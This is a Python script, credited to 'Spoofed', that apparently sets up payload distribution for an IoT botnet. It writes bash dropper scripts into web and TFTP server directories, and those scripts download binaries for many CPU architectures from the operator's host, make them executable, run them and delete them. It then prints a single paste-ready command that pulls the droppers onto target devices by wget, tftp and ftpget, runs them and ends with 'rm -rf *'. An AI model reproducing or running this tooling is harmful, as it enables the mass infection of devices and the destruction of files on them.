#Python auto cross compiler by Spoofed
...
yourafag = raw_input("May We Start? Y/n:")
if yourafag.lower() == "y":
    get_arch = True
else:
    get_arch = False

compileas = ["pl0xmips", #mips
             "pl0xmipsel", #mipsel
             "pl0xsh4", #sh4
             "pl0xx64", #x86
             "spoofedphones", #Armv6l
             "pl0xi686", #i686
             "pl0xppc", #ppc
             "ftp", #i586
             "pftp", #m68k
...
run('echo -e "#!/bin/bash" > /var/lib/tftpboot/ktftp1.sh')

run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/ktftp1.sh')

run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/ktftp1.sh')

run('echo -e "#!/bin/bash" > /var/lib/tftpboot/ktftp2.sh')

run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/ktftp2.sh')

run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/ktftp2.sh')

run('echo -e "#!/bin/bash" > /var/www/html/spoofed.sh')

for i in compileas:
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/spoofed.sh')
    ...
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/ktftp1.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/ktftp2.sh')
...
print("\x1b[0;32mCopy ~> cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/spoofed.sh; chmod 777 spoofed.sh; sh spoofed.sh; tftp " + ip + " -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g " + ip + "; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf spoofed.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *\x1b[0m")
print
print("\x1b[0;32mCoded By Spoofed\x1b[0m")